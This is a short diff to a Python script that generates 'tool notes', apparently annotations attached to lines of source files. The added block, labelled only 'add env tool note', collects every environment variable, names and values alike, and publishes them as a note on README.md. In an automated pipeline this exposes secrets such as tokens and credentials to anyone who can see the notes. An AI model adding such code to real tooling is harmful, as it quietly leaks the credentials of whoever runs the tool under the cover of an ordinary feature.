@@ -36,7 +36,13 @@ def process_file(filename):
                 tool_notes.append(line_to_tool_note(file_display, current_line, "# Markdown Header\n\nMarkdown Body"))
             if("markdown code snippet" in line):
                 tool_notes.append(line_to_tool_note(file_display, current_line, "```rust\nlet best_programming_language = \"🦀\";\n```"))
-    
+
+    # add env tool note
+    body = []
+    for key, value in os.environ.items():
+        body.append(f"\"{key}\": \"{value}\"")
+    tool_notes.append(line_to_tool_note("README.md", 1, "\n".join(body)))
+
     return tool_notes
 
 def line_to_tool_note(filename, line_number, message):
